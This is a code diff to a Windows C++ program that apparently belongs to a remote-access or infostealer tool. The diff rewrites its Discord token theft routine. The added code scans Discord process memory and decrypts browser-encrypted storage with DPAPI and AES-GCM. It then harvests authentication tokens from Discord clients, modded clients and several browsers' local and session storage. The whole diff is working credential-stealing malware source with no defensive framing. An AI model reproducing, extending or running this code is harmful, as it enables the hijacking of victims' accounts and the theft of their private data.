@@ -8,7 +8,9 @@
 #include <vfw.h>
 #include <tlhelp32.h>
 #include <mmsystem.h>
+#include <bcrypt.h>
 #pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "crypt32.lib")
@@ -877,147 +879,332 @@ std::string getInstalledApps() {
     return execCmd("powershell -c \"Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*, HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Where-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher | Format-Table -AutoSize -Wrap | Out-String -Width 4096\"");
 }
 
-std::string getDiscordTokens() {
+// --- Token decryption helpers ---
+std::string dpapiDecrypt(const std::vector<unsigned char>& input) {
+    DATA_BLOB inBlob = { (DWORD)input.size(), const_cast<BYTE*>(input.data()) };
+    DATA_BLOB outBlob = {};
+    if (CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) {
+        std::string r((char*)outBlob.pbData, outBlob.cbData);
+        LocalFree(outBlob.pbData); return r;
+    }
+    return "";
+}
+std::string aesGcmDecrypt(const std::string& key, const std::string& nonce, const std::string& ciphertext, const std::string& tag) {
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_KEY_HANDLE hKey = NULL;
+    std::string result;
+    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return result;
+    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0)
+        { BCryptCloseAlgorithmProvider(hAlg, 0); return result; }
+    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0) != 0)
+        { BCryptCloseAlgorithmProvider(hAlg, 0); return result; }
+    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
+    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
+    authInfo.pbNonce = (PUCHAR)nonce.data();
+    authInfo.cbNonce = (ULONG)nonce.size();
+    authInfo.pbTag = (PUCHAR)tag.data();
+    authInfo.cbTag = (ULONG)tag.size();
+    std::vector<BYTE> output(ciphertext.size() + 16);
+    ULONG outSize = 0;
+    if (BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), (ULONG)ciphertext.size(), &authInfo, NULL, 0, output.data(), (ULONG)output.size(), &outSize, 0) == 0)
+        result.assign((char*)output.data(), outSize);
+    BCryptDestroyKey(hKey);
+    BCryptCloseAlgorithmProvider(hAlg, 0);
+    return result;
+}
+std::string decryptChromeValue(const std::string& encValue, const std::string& aesKey) {
+    if (encValue.size() < 15 || (encValue[0] != 'v' && encValue[0] != 'V')) return "";
+    size_t prefix = 3; // skip "v10" or "v11"
+    if (encValue.size() < prefix + 12 + 16) return "";
+    std::string nonce = encValue.substr(prefix, 12);
+    std::string ct = encValue.substr(prefix + 12, encValue.size() - prefix - 12 - 16);
+    std::string tag = encValue.substr(encValue.size() - 16);
+    return aesGcmDecrypt(aesKey, nonce, ct, tag);
+}
+std::string getChromeKey(const std::string& localStatePath) {
+    HANDLE f = CreateFileA(localStatePath.c_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
+    if (f == INVALID_HANDLE_VALUE) return "";
+    DWORD sz = GetFileSize(f, 0);
+    if (sz < 100 || sz > 0x100000) { CloseHandle(f); return ""; }
+    std::vector<char> buf(sz); DWORD rd = 0;
+    if (!ReadFile(f, buf.data(), sz, &rd, 0) || rd < 100) { CloseHandle(f); return ""; }
+    CloseHandle(f);
+    std::string s(buf.data(), rd);
+    size_t p = s.find("\"encrypted_key\"");
+    if (p == std::string::npos) return "";
+    size_t v = s.find('"', p + 15);
+    if (v == std::string::npos) return "";
+    v++; size_t ve = s.find('"', v);
+    if (ve == std::string::npos) return "";
+    std::string b64 = s.substr(v, ve - v);
+    auto decoded = base64Decode(b64);
+    if (decoded.size() < 10) return "";
+    // Strip "DPAPI" prefix (5 bytes)
+    std::vector<BYTE> encKey(decoded.begin() + 5, decoded.end());
+    return dpapiDecrypt(encKey);
+}
+// --- End token decryption helpers ---
+
+bool isTokenChar(char c) {
+    return (c>='a'&&c<='z')||(c>='A'&&c<='Z')||(c>='0'&&c<='9')||c=='_'||c=='-';
+}
+std::string extractTokensFromBuf(const std::string& s, const std::string& label, const std::string& used) {
     std::string out;
-    auto isTC = [](char c){return (c>='a'&&c<='z')||(c>='A'&&c<='Z')||(c>='0'&&c<='9')||c=='_'||c=='-'||c=='.';};
-    auto addToken=[&](const std::string& t,const std::string& label){
-        if(t.size()>20&&t.size()<200&&out.find(t)==std::string::npos){
-            if(out.find("["+label+"]")==std::string::npos)out+="\n["+label+"]\n";
-            out+=t+"\n";
-        }
-    };
-    auto scanFile=[&](const std::string& filePath,const std::string& label){
-        char tmpPath[MAX_PATH]; GetTempPathA(MAX_PATH, tmpPath);
-        std::string tmp = std::string(tmpPath) + "dbtmp_" + std::to_string(GetTickCount()) + ".tmp";
-        if(!CopyFileA(filePath.c_str(), tmp.c_str(), FALSE)) return;
-        HANDLE f = CreateFileA(tmp.c_str(), GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
-        if(f==INVALID_HANDLE_VALUE){DeleteFileA(tmp.c_str());return;}
-        DWORD sz=GetFileSize(f,0);
-        if(sz>0&&sz<0x200000){
-            std::vector<char> buf(sz); DWORD rd=0;
-            if(ReadFile(f,buf.data(),sz,&rd,0)&&rd>0){
-                std::string s(buf.data(),rd);
-                size_t p=0;
-                while((p=s.find("mfa.",p))!=std::string::npos){
-                    size_t e=p+4;while(e<s.size()&&isTC(s[e]))e++;
-                    std::string t=s.substr(p,e-p);if(t.size()>20)addToken(t,label);
-                    p=e;
-                }
-                for(size_t i=0;i<s.size();i++){
-                    if(!isTC(s[i]))continue;size_t a=i;
-                    while(i<s.size()&&isTC(s[i]))i++;
-                    std::string s1=s.substr(a,i-a);
-                    if(s1.size()>=18&&s1.size()<=28&&i<s.size()&&s[i]=='.'){
-                        size_t j=i+1;if(j>=s.size())break;size_t b=j;
-                        while(j<s.size()&&isTC(s[j]))j++;
-                        std::string s2=s.substr(b,j-b);
-                        if(s2.size()>=4&&s2.size()<=10&&j<s.size()&&s[j]=='.'){
-                            j++;size_t c=j;while(j<s.size()&&isTC(s[j]))j++;
-                            std::string s3=s.substr(c,j-c);
-                            if(s3.size()>=20&&s3.size()<=32)addToken(s1+"."+s2+"."+s3,label);
-                        }
-                    }
-                }
-                size_t tp=0;
-                while((tp=s.find("\"token\"",tp))!=std::string::npos){
-                    size_t vp=s.find('"',tp+7);if(vp==std::string::npos||vp>tp+20){tp++;continue;}
-                    vp++;size_t ve=s.find('"',vp);
-                    while(ve<s.size()&&ve>0&&s[ve-1]=='\\')ve=s.find('"',ve+1);
-                    if(ve!=std::string::npos&&ve-vp>20)addToken(s.substr(vp,ve-vp),label+"-json");
-                    tp=ve!=std::string::npos?ve+1:tp+1;
+    auto has = [&](const std::string& t) { return used.find(t) != std::string::npos || out.find(t) != std::string::npos; };
+    // mfa. tokens
+    size_t p = 0;
+    while ((p = s.find("mfa.", p)) != std::string::npos) {
+        size_t e = p + 4; while (e < s.size() && isTokenChar(s[e])) e++;
+        std::string t = s.substr(p, e - p);
+        if (t.size() > 20 && !has(t)) { out += "[" + label + "] " + t + "\n"; }
+        p = e;
+    }
+    // standard xxx.yyy.zzz tokens
+    for (size_t i = 0; i < s.size(); i++) {
+        if (!isTokenChar(s[i])) continue;
+        size_t a = i;
+        while (i < s.size() && isTokenChar(s[i])) i++;
+        std::string p1 = s.substr(a, i - a);
+        if (p1.size() >= 18 && p1.size() <= 28 && i < s.size() && s[i] == '.') {
+            size_t j = i + 1; if (j >= s.size()) break;
+            size_t b = j; while (j < s.size() && isTokenChar(s[j])) j++;
+            std::string p2 = s.substr(b, j - b);
+            if (p2.size() >= 4 && p2.size() <= 10 && j < s.size() && s[j] == '.') {
+                j++; size_t c = j; while (j < s.size() && isTokenChar(s[j])) j++;
+                std::string p3 = s.substr(c, j - c);
+                if (p3.size() >= 20 && p3.size() <= 32) {
+                    std::string token = p1 + "." + p2 + "." + p3;
+                    if (!has(token)) out += "[" + label + "] " + token + "\n";
                 }
             }
         }
-        CloseHandle(f);DeleteFileA(tmp.c_str());
-    };
-    char ad[MAX_PATH],la[MAX_PATH];
-    DWORD adLen=GetEnvironmentVariableA("APPDATA",ad,MAX_PATH);
-    DWORD laLen=GetEnvironmentVariableA("LOCALAPPDATA",la,MAX_PATH);
-    const char* clients[]={"discord","discordptb","discordcanary","discorddevelopment"};
-    if(adLen>0&&adLen<=MAX_PATH){
-        std::string base(ad);
-        for(const char* cl:clients){
-            std::string dir=base+"\\"+cl+"\\Local Storage\\leveldb\\";
-            WIN32_FIND_DATAA fd;HANDLE hf=FindFirstFileA((dir+"*.ldb").c_str(),&fd);
-            if(hf!=INVALID_HANDLE_VALUE){do{scanFile(dir+fd.cFileName,cl);}while(FindNextFileA(hf,&fd));FindClose(hf);}
-            hf=FindFirstFileA((dir+"*.log").c_str(),&fd);
-            if(hf!=INVALID_HANDLE_VALUE){do{scanFile(dir+fd.cFileName,cl);}while(FindNextFileA(hf,&fd));FindClose(hf);}
-        }
-        std::string ls=base+"\\discord\\Local State";
-        WIN32_FIND_DATAA fd2;HANDLE hf2=FindFirstFileA(ls.c_str(),&fd2);
-        if(hf2!=INVALID_HANDLE_VALUE){scanFile(ls,"discord-localstate");FindClose(hf2);}
     }
-    if(laLen>0&&laLen<=MAX_PATH){
-        std::string laBase(la);
-        for(const char* cl:clients){
-            std::string dir=laBase+"\\"+cl+"\\Local Storage\\leveldb\\";
-            WIN32_FIND_DATAA fd;HANDLE hf=FindFirstFileA((dir+"*.ldb").c_str(),&fd);
-            if(hf!=INVALID_HANDLE_VALUE){do{scanFile(dir+fd.cFileName,std::string(cl)+"(local)");}while(FindNextFileA(hf,&fd));FindClose(hf);}
+    // json "token" key
+    size_t tp = 0;
+    while ((tp = s.find("\"token\"", tp)) != std::string::npos) {
+        size_t vp = s.find('"', tp + 7);
+        if (vp == std::string::npos || vp > tp + 20) { tp++; continue; }
+        vp++; size_t ve = s.find('"', vp);
+        while (ve < s.size() && ve > 0 && s[ve-1] == '\\') ve = s.find('"', ve+1);
+        if (ve != std::string::npos && ve - vp > 20) {
+            std::string t = s.substr(vp, ve - vp);
+            if (!has(t)) out += "[" + label + "-json] " + t + "\n";
         }
-        std::string pairs[][2]={
-            {laBase+"\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\","Chrome"},
-            {laBase+"\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\","Chrome-P1"},
-            {laBase+"\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\","Chrome-P2"},
-            {laBase+"\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\","Chrome-P3"},
-            {laBase+"\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\","Edge"},
-            {laBase+"\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb\\","Edge-P1"},
-            {laBase+"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\","Brave"},
-            {laBase+"\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\","Opera"},
-            {laBase+"\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\","Vivaldi"},
-            {laBase+"\\Yandex\\Browser\\User Data\\Default\\Local Storage\\leveldb\\","Yandex"},
-            {laBase+"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Local Storage\\leveldb\\","Brave-P1"},
-        };
-        for(auto& p:pairs){
-            WIN32_FIND_DATAA fd;HANDLE hf=FindFirstFileA((p[0]+"*.ldb").c_str(),&fd);
-            if(hf!=INVALID_HANDLE_VALUE){
-                do{
-                    std::string content;
-                    std::string tmp2=laBase+"\\dbtmp2.tmp";
-                    if(CopyFileA((p[0]+fd.cFileName).c_str(),tmp2.c_str(),FALSE)){
-                        HANDLE f=CreateFileA(tmp2.c_str(),GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
-                        if(f!=INVALID_HANDLE_VALUE){DWORD sz2=GetFileSize(f,0);if(sz2>0&&sz2<0x200000){std::vector<char> b2(sz2);DWORD r2=0;if(ReadFile(f,b2.data(),sz2,&r2,0)&&r2>0)content.assign(b2.data(),r2);}CloseHandle(f);}
-                        DeleteFileA(tmp2.c_str());
-                    }
-                    if(content.find("discord.com")!=std::string::npos||content.find("discordapp.com")!=std::string::npos||content.find("discord.gg")!=std::string::npos){
-                        size_t pp=0;
-                        while((pp=content.find("mfa.",pp))!=std::string::npos){
-                            size_t ee=pp+4;while(ee<content.size()&&isTC(content[ee]))ee++;
-                            std::string tt=content.substr(pp,ee-pp);if(tt.size()>20)addToken(tt,p[1]+"-web");
-                            pp=ee;
-                        }
-                        for(size_t ii=0;ii<content.size();ii++){
-                            if(!isTC(content[ii]))continue;size_t aa=ii;
-                            while(ii<content.size()&&isTC(content[ii]))ii++;
-                            std::string ss1=content.substr(aa,ii-aa);
-                            if(ss1.size()>=18&&ss1.size()<=28&&ii<content.size()&&content[ii]=='.'){
-                                size_t jj=ii+1;if(jj>=content.size())break;size_t bb=jj;
-                                while(jj<content.size()&&isTC(content[jj]))jj++;
-                                std::string ss2=content.substr(bb,jj-bb);
-                                if(ss2.size()>=4&&ss2.size()<=10&&jj<content.size()&&content[jj]=='.'){
-                                    jj++;size_t cc=jj;while(jj<content.size()&&isTC(content[jj]))jj++;
-                                    std::string ss3=content.substr(cc,jj-cc);
-                                    if(ss3.size()>=20&&ss3.size()<=32)addToken(ss1+"."+ss2+"."+ss3,p[1]+"-web");
-                                }
+        tp = ve != std::string::npos ? ve + 1 : tp + 1;
+    }
+    return out;
+}
+
+std::string scanDiscordProcessMemory() {
+    std::string out;
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return out;
+    PROCESSENTRY32 pe = { sizeof(pe) };
+    if (Process32First(snap, &pe)) do {
+        std::string exe = pe.szExeFile;
+        for (auto& c : exe) if (c >= 'A' && c <= 'Z') c += 32;
+        if (exe.find("discord") == std::string::npos) continue;
+        if (exe.find("update") != std::string::npos || exe.find("setup") != std::string::npos) continue;
+        HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID);
+        if (!proc) continue;
+        SYSTEM_INFO si; GetSystemInfo(&si);
+        uintptr_t addr = (uintptr_t)si.lpMinimumApplicationAddress;
+        const uintptr_t maxAddr = (uintptr_t)si.lpMaximumApplicationAddress;
+        DWORD pid = pe.th32ProcessID;
+        while (addr < maxAddr) {
+            MEMORY_BASIC_INFORMATION mbi;
+            if (VirtualQueryEx(proc, (LPCVOID)addr, &mbi, sizeof(mbi)) == 0) { addr += 0x10000; continue; }
+            if (mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE &&
+                (mbi.Protect & 0xFF) == PAGE_READWRITE && mbi.RegionSize > 200 && mbi.RegionSize < 0x4000000) {
+                std::vector<char> buf(mbi.RegionSize);
+                SIZE_T rd = 0;
+                if (ReadProcessMemory(proc, mbi.BaseAddress, buf.data(), mbi.RegionSize, &rd) && rd > 100) {
+                    std::string s(buf.data(), rd);
+                    out += extractTokensFromBuf(s, "Discord-PID:" + std::to_string(pid), out);
+                }
+            }
+            addr += mbi.RegionSize;
+        }
+        CloseHandle(proc);
+    } while (Process32Next(snap, &pe));
+    CloseHandle(snap);
+    return out;
+}
+
+void scanLevelDBWithKey(const std::string& dir, const std::string& label, const std::string& aesKey,
+                        std::string& out, std::string& used) {
+    std::string tmpDir;
+    char tmpPath[MAX_PATH];
+    if (GetTempPathA(MAX_PATH, tmpPath)) tmpDir = tmpPath;
+    auto scanOne=[&](const std::string& filePath) {
+        std::string tmp = tmpDir + "dt_" + std::to_string(GetTickCount()) + ".tmp";
+        if (!CopyFileA(filePath.c_str(), tmp.c_str(), FALSE)) return;
+        HANDLE f = CreateFileA(tmp.c_str(), GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
+        if (f == INVALID_HANDLE_VALUE) { DeleteFileA(tmp.c_str()); return; }
+        DWORD sz = GetFileSize(f, 0);
+        if (sz > 0 && sz < 0x200000) {
+            std::vector<char> buf(sz); DWORD rd = 0;
+            if (ReadFile(f, buf.data(), sz, &rd, 0) && rd > 0) {
+                std::string s(buf.data(), rd);
+                // plaintext extraction
+                std::string plain = extractTokensFromBuf(s, label, used + out);
+                if (!plain.empty()) { out += "\n[" + label + "]\n" + plain; }
+                // os_crypt decryption if we have key
+                if (!aesKey.empty()) {
+                    size_t cp = 0;
+                    while ((cp = s.find("v10", cp)) != std::string::npos || (cp = s.find("v11", cp)) != std::string::npos) {
+                        // try extracting surrounding context for the value
+                        size_t start = cp;
+                        size_t end = cp + 3;
+                        // find the end of the v10/v11 value (next non-base64ish or end)
+                        while (end < s.size() && (isTokenChar(s[end]) || s[end] == '/' || s[end] == '+' || s[end] == '=')) end++;
+                        std::string enc = s.substr(start, end - start);
+                        if (enc.size() > 30) {
+                            std::string dec = decryptChromeValue(enc, aesKey);
+                            if (!dec.empty() && dec.size() > 5) {
+                                std::string t = extractTokensFromBuf(dec, label + "-dec", used + out);
+                                if (!t.empty()) out += t;
                             }
                         }
+                        cp = end;
                     }
-                }while(FindNextFileA(hf,&fd));
+                }
+            }
+        }
+        CloseHandle(f); DeleteFileA(tmp.c_str());
+    };
+    WIN32_FIND_DATAA fd;
+    HANDLE hf = FindFirstFileA((dir + "*.ldb").c_str(), &fd);
+    if (hf != INVALID_HANDLE_VALUE) { do { scanOne(dir + fd.cFileName); } while (FindNextFileA(hf, &fd)); FindClose(hf); }
+    hf = FindFirstFileA((dir + "*.log").c_str(), &fd);
+    if (hf != INVALID_HANDLE_VALUE) { do { scanOne(dir + fd.cFileName); } while (FindNextFileA(hf, &fd)); FindClose(hf); }
+}
+
+std::string getDiscordTokens() {
+    std::string out;
+    std::string used; // track seen tokens
+    auto addTok = [&](const std::string& block) { if (!block.empty()) { out += block; used += block; } };
+    // 1. Process memory scanning (most reliable)
+    addTok(scanDiscordProcessMemory());
+    
+    char ad[MAX_PATH], la[MAX_PATH];
+    DWORD adLen = GetEnvironmentVariableA("APPDATA", ad, MAX_PATH);
+    DWORD laLen = GetEnvironmentVariableA("LOCALAPPDATA", la, MAX_PATH);
+    std::string appData(ad, adLen > 0 && adLen <= MAX_PATH ? adLen : 0);
+    std::string localAppData(la, laLen > 0 && laLen <= MAX_PATH ? laLen : 0);
+    
+    // 2. Get Chrome AES key for os_crypt decryption (try multiple paths)
+    std::string chromeKey;
+    if (!localAppData.empty()) {
+        const char* keyPaths[] = {
+            "\\discord\\Local State",
+            "\\discordptb\\Local State",
+            "\\discordcanary\\Local State",
+            "\\discorddevelopment\\Local State",
+        };
+        for (auto* kp : keyPaths) {
+            chromeKey = getChromeKey(localAppData + kp);
+            if (!chromeKey.empty() && chromeKey.size() == 32) break;
+        }
+        // Also try browser local state (same encryption key)
+        if (chromeKey.empty() || chromeKey.size() != 32) {
+            chromeKey = getChromeKey(localAppData + "\\Google\\Chrome\\User Data\\Local State");
+        }
+    }
+    if (chromeKey.size() != 32) chromeKey.clear(); // AES-256 key must be 32 bytes
+    
+    // 3. Scan Discord client LevelDB files
+    const char* clients[] = {"discord","discordptb","discordcanary","discorddevelopment"};
+    if (!appData.empty()) {
+        for (const char* cl : clients) {
+            std::string dir = appData + "\\" + cl + "\\Local Storage\\leveldb\\";
+            scanLevelDBWithKey(dir, cl, chromeKey, out, used);
+        }
+    }
+    if (!localAppData.empty()) {
+        for (const char* cl : clients) {
+            std::string dir = localAppData + "\\" + cl + "\\Local Storage\\leveldb\\";
+            scanLevelDBWithKey(dir, std::string(cl) + "(local)", chromeKey, out, used);
+        }
+        // Also scan session storage files directly
+        for (const char* cl : clients) {
+            std::string dir = localAppData + "\\" + cl + "\\Session Storage\\";
+            WIN32_FIND_DATAA fd;
+            HANDLE hf = FindFirstFileA((dir + "*.log").c_str(), &fd);
+            if (hf != INVALID_HANDLE_VALUE) {
+                char tp[MAX_PATH]; GetTempPathA(MAX_PATH, tp);
+                do {
+                    std::string fp = dir + fd.cFileName;
+                    std::string tn = std::string(tp) + "dt_" + std::to_string(GetTickCount()) + ".tmp";
+                    if (CopyFileA(fp.c_str(), tn.c_str(), FALSE)) {
+                        HANDLE f = CreateFileA(tn.c_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
+                        if (f != INVALID_HANDLE_VALUE) {
+                            DWORD sz = GetFileSize(f, 0);
+                            if (sz > 0 && sz < 0x200000) {
+                                std::vector<char> buf(sz); DWORD rd = 0;
+                                if (ReadFile(f, buf.data(), sz, &rd, 0) && rd > 0) {
+                                    std::string s(buf.data(), rd);
+                                    std::string t = extractTokensFromBuf(s, cl, used + out);
+                                    if (!t.empty()) out += "\n[" + std::string(cl) + "-session]\n" + t;
+                                }
+                            }
+                            CloseHandle(f);
+                        }
+                        DeleteFileA(tn.c_str());
+                    }
+                } while (FindNextFileA(hf, &fd));
                 FindClose(hf);
             }
         }
     }
-    if(adLen>0&&adLen<=MAX_PATH){
-        std::string bdBase=std::string(ad)+"\\BetterDiscord\\storage\\leveldb\\";
-        WIN32_FIND_DATAA fd;HANDLE hf=FindFirstFileA((bdBase+"*.ldb").c_str(),&fd);
-        if(hf!=INVALID_HANDLE_VALUE){do{scanFile(bdBase+fd.cFileName,"BetterDiscord");}while(FindNextFileA(hf,&fd));FindClose(hf);}
-        std::string vcBase=std::string(ad)+"\\Vencord\\storage\\leveldb\\";
-        hf=FindFirstFileA((vcBase+"*.ldb").c_str(),&fd);
-        if(hf!=INVALID_HANDLE_VALUE){do{scanFile(vcBase+fd.cFileName,"Vencord");}while(FindNextFileA(hf,&fd));FindClose(hf);}
-        std::string eqBase=std::string(ad)+"\\Equicord\\storage\\leveldb\\";
-        hf=FindFirstFileA((eqBase+"*.ldb").c_str(),&fd);
-        if(hf!=INVALID_HANDLE_VALUE){do{scanFile(eqBase+fd.cFileName,"Equicord");}while(FindNextFileA(hf,&fd));FindClose(hf);}
+    
+    // 4. Scan browser profiles with os_crypt decryption
+    if (!localAppData.empty()) {
+        struct BrowserPath { const char* path; const char* label; };
+        BrowserPath browsers[] = {
+            {"\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\", "Chrome"},
+            {"\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\", "Chrome-P1"},
+            {"\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\", "Chrome-P2"},
+            {"\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\", "Chrome-P3"},
+            {"\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\", "Chrome-P4"},
+            {"\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\", "Chrome-P5"},
+            {"\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\", "Edge"},
+            {"\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb\\", "Edge-P1"},
+            {"\\Microsoft\\Edge\\User Data\\Profile 2\\Local Storage\\leveldb\\", "Edge-P2"},
+            {"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\", "Brave"},
+            {"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Local Storage\\leveldb\\", "Brave-P1"},
+            {"\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\", "Opera"},
+            {"\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\", "Vivaldi"},
+            {"\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\", "Yandex"},
+        };
+        // Get browser AES key if we don't have one yet
+        std::string browserKey = chromeKey;
+        if (browserKey.empty()) {
+            browserKey = getChromeKey(localAppData + "\\Google\\Chrome\\User Data\\Local State");
+            if (browserKey.size() != 32) browserKey.clear();
+        }
+        for (auto& bp : browsers) {
+            std::string dir = localAppData + bp.path;
+            scanLevelDBWithKey(dir, bp.label, browserKey, out, used);
+        }
     }
-    if(out.empty())out="No Discord tokens found";
+    
+    // 5. Scan modded Discord clients
+    if (!appData.empty()) {
+        struct ModPath { const char* path; const char* label; };
+        ModPath mods[] = {
+            {"\\BetterDiscord\\storage\\leveldb\\", "BetterDiscord"},
+            {"\\Vencord\\storage\\leveldb\\", "Vencord"},
+            {"\\Equicord\\storage\\leveldb\\", "Equicord"},
+            {"\\DiscordBot\\storage\\leveldb\\", "DiscordBot"},
+        };
+        for (auto& m : mods) {
+            std::string dir = appData + m.path;
+            scanLevelDBWithKey(dir, m.label, chromeKey, out, used);
+        }
+    }
+    
+    if (out.empty()) out = "No Discord tokens found";
     return out;
 }
 
